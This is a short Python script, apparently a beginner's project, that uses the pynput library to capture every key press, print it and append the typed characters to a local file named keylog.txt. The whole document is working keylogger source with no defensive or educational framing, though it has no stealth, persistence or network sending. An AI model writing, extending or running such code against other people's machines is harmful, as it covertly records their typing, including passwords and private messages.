from pynput import keyboard

# create function for key pressed then open key log file and try wheter work or except error for char.
def keyPressed(key):   
    print(str(key))       
    with open("keylog.txt", 'a') as logkey:
        try:    
           char = key.char
           logkey.write(char) 
        except:
            print("Error getting char")  

 # This block of code runs when the script is executed directly.
if __name__=="__main__":   
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
